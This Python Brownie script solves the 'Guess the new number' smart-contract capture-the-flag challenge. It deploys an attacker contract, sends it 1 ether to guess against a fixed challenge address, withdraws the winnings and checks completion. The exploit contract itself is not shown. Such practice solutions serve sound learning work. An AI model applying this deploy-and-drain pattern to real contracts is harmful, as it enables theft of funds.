import sys
from dotenv import dotenv_values
PROJECT_SCRIPTS_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/scripts/"
PROJECT_BUILD_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/build/"
sys.path.insert(1, PROJECT_SCRIPTS_PATH)
from helpful_scripts import get_account, padHexTo32Bytes
from brownie import Contract, AttackNewNumber
from web3 import Web3
import json
PUBLIC_KEY = dotenv_values(".env")["PUBLIC_KEY"]


def main():
    ###########
    # SETUP
    ###########
    with open(PROJECT_BUILD_PATH + "contracts/GuessTheNewNumberChallenge.json") as f:
        info_json = json.load(f)
    Challenge_ABI = info_json["abi"]
    with open(PROJECT_BUILD_PATH + "contracts/AttackNewNumber.json") as f:
        info_json = json.load(f)
    Attack_ABI = info_json["abi"]
    Challenge_Address = "0x5cdDa4e509C7a108a6211CABdDaFA776B1b4027B"
    challengeContract = Contract.from_abi(name="", address=Challenge_Address,abi=Challenge_ABI)
    account = get_account()

    ###########
    # SOLVING
    ###########
    attack = AttackNewNumber.deploy({"from": account})
    attack_tx = attack.guess(Challenge_Address, {'from': account, 'value': Web3.toWei(1, 'ether'), 'gas_limit':1000000, 'allow_revert':True})
    attack_tx.wait(1)
    withdraw_tx = attack.withdraw({'from': account})
    withdraw_tx.wait(1)

    ###########
    # CHECKING
    ###########
    
    isComplete = challengeContract.isComplete()
    print(isComplete)
    
    print('Finished')

if __name__ == "__main__":
    main()